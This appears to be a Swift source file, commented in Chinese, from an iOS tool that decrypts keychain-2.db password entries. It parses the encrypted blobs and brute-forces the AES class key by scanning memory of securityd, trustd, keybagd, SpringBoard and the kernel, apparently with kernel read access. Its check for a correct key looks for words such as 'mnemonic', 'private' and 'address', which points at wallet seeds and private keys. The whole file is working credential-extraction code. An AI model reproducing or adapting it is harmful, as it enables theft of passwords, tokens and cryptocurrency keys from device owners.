//
//  SFACDecryptor.swift
//  lara
//
//  SFAC（Secure File Authenticated Cipher）解密
//
//  背景（已实测确认）：
//    keychain-2.db 的 genp.data 结构是
//      protobuf → protobuf → bplist(NSKeyedArchiver)
//        → _SFAuthenticatedCiphertext
//            SFInitializationVector  16 B
//            SFCiphertext            变长（非 16 对齐 ⇒ 流密码，CTR/GCM）
//            SFAuthenticationCode    32 B
//
//  解密密钥是「class key」，解锁后由内核 keybag 持有明文形式。
//  这里不依赖任何 keybag 结构体布局，改用「已知明文验证 + 暴力枚举」：
//    拿一条真实的 (IV, 密文, tag)，在 securityd/trustd 内存里逐 4 字节取
//    32 字节候选当作 AES-256 密钥，CTR 解一段，看是否出现 "bplist"。
//    AES 的雪崩效应保证误判概率可忽略。
//

import Foundation
import CommonCrypto

// MARK: - 数据模型

struct SFACBlob {
    let iv: Data
    let ciphertext: Data
    let authCode: Data
}

struct GPItem {
    let rowid: Int64
    let agrp: String
    let acct: String
    let svce: String
    let rawData: Data          // genp.data 原始字节
    var sac: SFACBlob?         // 解析出的密文三件套
}

// MARK: - 解析 genp.data

enum SFACParser {

    /// 极简 protobuf：返回所有 length-delimited 字段
    static func pbFields(_ buf: Data) -> [Data] {
        var out: [Data] = []
        let b = [UInt8](buf)
        var i = 0
        let n = b.count
        while i < n {
            var key: UInt64 = 0
            var sh: UInt64 = 0
            while i < n {
                let x = b[i]; i += 1
                key |= UInt64(x & 0x7F) << sh
                if x & 0x80 == 0 { break }
                sh += 7
            }
            let wt = key & 7
            if wt == 0 {
                while i < n {
                    let x = b[i]; i += 1
                    if x & 0x80 == 0 { break }
                }
            } else if wt == 2 {
                var ln: UInt64 = 0
                var s: UInt64 = 0
                while i < n {
                    let x = b[i]; i += 1
                    ln |= UInt64(x & 0x7F) << s
                    if x & 0x80 == 0 { break }
                    s += 7
                }
                let e = Int(min(UInt64(n), UInt64(i) + ln))
                out.append(Data(b[i..<e]))
                i = e
            } else if wt == 1 { i += 8 }
            else if wt == 5 { i += 4 }
            else { break }
        }
        return out
    }

    /// 把 genp.data 解析成 SFACBlob
    /// 已知结构：外层 pb → 内层 pb → bplist
    static func parse(_ data: Data) -> SFACBlob? {
        for outer in pbFields(data) {
            for inner in pbFields(outer) {
                guard inner.count > 8 else { continue }
                // 找 bplist 起点
                guard let r = inner.range(of: Data("bplist".utf8)) else { continue }
                let plistData = inner.subdata(in: r.lowerBound..<inner.endIndex)
                if let sac = parseArchiver(plistData) { return sac }
            }
        }
        // 兜底：整段里直接找 bplist
        if let r = data.range(of: Data("bplist".utf8)) {
            return parseArchiver(data.subdata(in: r.lowerBound..<data.endIndex))
        }
        return nil
    }

    /// 解析 NSKeyedArchiver，取 $objects[2]=密文 [3]=tag [4]=IV
    static func parseArchiver(_ d: Data) -> SFACBlob? {
        // plist 是自描述的，尾部 32 字节 trailer 里有 offsetTableOffset
        // 但直接交给 PropertyListSerialization 也行，多给几个字节不会崩
        guard let pl = try? PropertyListSerialization.propertyList(
            from: d, options: [], format: nil) as? [String: Any] else { return nil }
        guard let objs = pl["$objects"] as? [Any], objs.count >= 5 else { return nil }

        // 已知顺序：2=ciphertext 3=authcode 4=iv
        let ct = blobBytes(objs[2])
        let tag = blobBytes(objs[3])
        let iv = blobBytes(objs[4])
        guard let ct, let tag, let iv, !ct.isEmpty, !iv.isEmpty else { return nil }
        return SFACBlob(iv: iv, ciphertext: ct, authCode: tag)
    }

    private static func blobBytes(_ o: Any) -> Data? {
        if let d = o as? Data { return d }
        if let d = o as? NSData { return d as Data }
        return nil
    }
}

// MARK: - AES

enum AESCTR {

    /// AES-CTR 解密（Apple 用大端计数器）
    static func decrypt(key: Data, iv: Data, ciphertext: Data) -> Data? {
        guard key.count == 16 || key.count == 24 || key.count == 32 else { return nil }
        guard iv.count == 16 else { return nil }

        var out = Data(count: ciphertext.count)
        var moved = 0
        var cryptor: CCCryptorRef?

        let st = key.withUnsafeBytes { kp -> CCCryptorStatus in
            iv.withUnsafeBytes { ip in
                CCCryptorCreateWithMode(
                    CCOperation(kCCDecrypt),
                    CCMode(kCCModeCTR),
                    CCAlgorithm(kCCAlgorithmAES),
                    CCPadding(ccNoPadding),
                    ip.baseAddress,
                    kp.baseAddress, key.count,
                    nil, 0, 0,
                    CCModeOptions(kCCModeOptionCTR_BE),
                    &cryptor)
            }
        }
        guard st == kCCSuccess, let c = cryptor else { return nil }
        defer { CCCryptorRelease(c) }

        let outLen = out.count
        let ctLen = ciphertext.count
        let ok = ciphertext.withUnsafeBytes { inP -> Bool in
            out.withUnsafeMutableBytes { outP -> Bool in
                CCCryptorUpdate(c, inP.baseAddress, ctLen,
                                outP.baseAddress, outLen, &moved) == kCCSuccess
            }
        }
        return ok ? out : nil
    }

    /// 用已知明文特征验证候选密钥
    /// 明文一定是 bplist 或 JSON/文本，先找 "bplist"
    static func looksRight(key: Data, sac: SFACBlob) -> Bool {
        // 只解前 256 字节做判定，省时间
        let head = sac.ciphertext.prefix(256)
        guard let pt = decrypt(key: key, iv: sac.iv, ciphertext: Data(head)) else { return false }
        if pt.range(of: Data("bplist".utf8)) != nil { return true }
        // 退一步：全可打印 ASCII/UTF-8 且含常见字段
        let printable = pt.filter { ($0 >= 0x20 && $0 < 0x7F) || $0 == 0x0A || $0 == 0x09 }
        if pt.count > 32 && printable.count * 100 / pt.count > 92 {
            if pt.range(of: Data("account".utf8)) != nil
                || pt.range(of: Data("mnemonic".utf8)) != nil
                || pt.range(of: Data("private".utf8)) != nil
                || pt.range(of: Data("address".utf8)) != nil {
                return true
            }
        }
        return false
    }
}

// MARK: - class key 猎取

enum ClassKeyHunter {

    private static var mgr: laramgr { laramgr.shared }

    /// 缓存，避免重复扫描
    private static var cache: [String: Data] = [:]

    /// 在 system 进程内存里找能解开这条 genp 的 class key
    /// 顺序：securityd → trustd → keybagd → 全内核
    static func hunt(sac: SFACBlob, hint: String = "") -> Data? {
        if let c = cache[hint], !hint.isEmpty {
            mgr.logmsg("[ck] 命中缓存")
            return c
        }

        let targets = ["securityd", "trustd", "keybagd", "SpringBoard", "kernel_task"]
        for t in targets {
            mgr.logmsg("[ck] 扫描 \(t) …")
            if let k = scanProc(t, sac: sac) {
                if !hint.isEmpty { cache[hint] = k }
                mgr.logmsg("[ck] ★ 在 \(t) 找到 class key: \(k.prefix(8).map { String(format: "%02x", $0) }.joined())…")
                return k
            }
        }
        return nil
    }

    /// 在指定进程的内存里逐 4 字节枚举 32/16 字节候选密钥
    private static func scanProc(_ name: String, sac: SFACBlob) -> Data? {
        var found: Data?
        _ = KernelScan.scanForKeys(procName: name) { chunk, base in
            let b = [UInt8](chunk)
            // 4 字节对齐枚举
            var off = 0
            while off + 32 <= b.count {
                let cand = Data(b[off..<(off + 32)])
                if AESCTR.looksRight(key: cand, sac: sac) {
                    found = cand
                    return true
                }
                // 16 字节 AES-128 也试
                let c16 = Data(b[off..<(off + 16)])
                if AESCTR.looksRight(key: c16, sac: sac) {
                    found = c16
                    return true
                }
                off += 4
            }
            return false
        }
        return found
    }
}

// MARK: - 对外入口

enum SFACDecryptor {

    private static var mgr: laramgr { laramgr.shared }

    /// 解密一条 genp，返回明文（可能是 bplist / JSON / 纯文本）
    static func decrypt(item: GPItem) -> Data? {
        guard let sac = item.sac else { return nil }

        // ① 先试从内核拿 class key
        if let key = ClassKeyHunter.hunt(sac: sac, hint: item.agrp) {
            if let pt = AESCTR.decrypt(key: key, iv: sac.iv, ciphertext: sac.ciphertext) {
                mgr.logmsg("[sfac] rowid=\(item.rowid) 解出 \(pt.count) B")
                return postProcess(pt)
            }
        }

        // ② 退一步：让 securityd 代解（需要 entitlement，通常失败）
        if let pt = viaSecItem(item: item) {
            mgr.logmsg("[sfac] rowid=\(item.rowid) SecItem 解出 \(pt.count) B")
            return postProcess(pt)
        }

        mgr.logmsg("[sfac] rowid=\(item.rowid) 解不开")
        return nil
    }

    /// 把明文再剥一层：若是 NSKeyedArchiver 就取出里面的字符串
    private static func postProcess(_ d: Data) -> Data {
        if d.range(of: Data("bplist".utf8)) != nil,
           let pl = try? PropertyListSerialization.propertyList(
               from: d, options: [], format: nil) {
            if let data = try? JSONSerialization.data(withJSONObject: unwrap(pl),
                                                      options: [.prettyPrinted]) {
                return data
            }
        }
        return d
    }

    /// 递归把 NSKeyedArchiver 展开成可 JSON 化的结构
    private static func unwrap(_ any: Any) -> Any {
        if let d = any as? Data {
            if let s = String(data: d, encoding: .utf8) { return s }
            return d.base64EncodedString()
        }
        if let a = any as? [Any] { return a.map { unwrap($0) } }
        if let m = any as? [String: Any] {
            var o: [String: Any] = [:]
            for (k, v) in m {
                if k == "$classes" || k == "$class" { continue }
                o[k] = unwrap(v)
            }
            return o
        }
        return any
    }

    private static func viaSecItem(item: GPItem) -> Data? {
        let q: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccessGroup as String: item.agrp,
            kSecAttrAccount as String: item.acct,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne,
        ]
        var r: CFTypeRef?
        let st = SecItemCopyMatching(q as CFDictionary, &r)
        if st == errSecSuccess, let d = r as? Data, !d.isEmpty { return d }
        return nil
    }
}
